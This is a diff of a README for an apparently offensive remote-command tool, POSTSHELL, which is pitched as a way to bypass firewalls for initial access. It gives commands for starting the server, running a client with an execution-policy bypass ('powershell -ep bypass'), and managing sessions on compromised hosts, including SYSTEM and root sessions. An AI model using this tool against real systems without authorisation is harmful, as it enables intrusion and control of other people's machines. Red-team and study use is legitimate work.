@@ -8,8 +8,15 @@
 ```
 Execute commands on clients using GET/POST requests. (Bypass Firewalls for initial access)
 
+
 # Disclaimer
 This is not meant to be used for illegal purposes. Use at your own discretion.
+
+# Getting Started
+1. Download POSTSHELL
+```
+git clone https://github.com/bwithe/postshell
+```
 
 # Usage
 1. To start the server
@@ -17,8 +24,10 @@ This is not meant to be used for illegal purposes. Use at your own discretion.
 python3 server.py <port>
 ```
 
-2. Modify, then transfer a client.<script> to connect to the SERVER
-  - Change IP, PORT, and CHECKIN time
+2. Modify the followinng, then transfer a client.<script> to connect to the SERVER
+  - IP
+  - PORT
+  - WAITTIME
 
 3. Execute the script on the client
 ```
@@ -29,15 +38,49 @@ python3 client.py
 powershell -ep bypass client.ps1
 ```
 
-4. View the Clients from the webpage
+4. To see active clients
+```
+postshell> list 
+╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦══════════════════╦════════╗
+║ ID ║ IP              ║ HOSTNAME        ║ USER    ║ OS             ║ VERSION          ║ ARCH   ║
+╠════╬═════════════════╬═════════════════╬═════════╬════════════════╬══════════════════╬════════╣
+║ 1  ║ 192.168.193.131 ║ ubuntu          ║ ubuntu  ║ Linux          ║ 6.8.0-41-generic ║        ║
+║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║ Linux          ║ 6.8.0-41-generic ║        ║
+║ 3  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ jimothy ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
+║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ system  ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
+╚════╩═════════════════╩═════════════════╩═════════╩════════════════╩══════════════════╩════════╝
+```
 
-<img width="1409" alt="Screenshot 2025-05-04 at 8 50 21 PM" src="https://github.com/user-attachments/assets/965f1c5b-4d10-4d2a-949e-5d8546c8af58" />
+5. To connect to an active session
+```
+postshell> select 3
+[jimothy@DESKTOP-P5KACDB]>
+```
 
-5. Execute commands, and wait for the client to GET the command, then POST the results
-  - `server.py` can be modified to allow more than 2 commands to be kept in the webpage history
+6. Execute commands, and wait for the client to GET the command, then POST the results
+```
+[jimothy@DESKTOP-P5KACDB]> pwd
+C:\Users\jimothy\Downloads
+```
+  
+7. To background a session
+```
+[jimothy@DESKTOP-P5KACDB]> background
+```
 
-<img width="580" alt="Screenshot 2025-05-04 at 8 50 47 PM" src="https://github.com/user-attachments/assets/bb562d5f-2f77-41aa-ba09-85a955eddbf2" />
+8. To kill the current session
+```
+[jimothy@DESKTOP-P5KACDB]> die
+```
 
-6. Each session will create a command history file.
+9. Kill an active session from the menu
+```
+postshell> kill 3
+[!] Sent kill command to jimothy@DESKTOP-P5KACDB
+```
 
-<img width="368" alt="Screenshot 2025-05-04 at 8 51 18 PM" src="https://github.com/user-attachments/assets/023d9b5b-8f5b-4506-bb6d-cdc8ca0d9b43" />
+10. To kill all sessions, and exit POSTSHELL
+```
+postshell> exit 
+[!] Shutting down server and all sessions.
+```
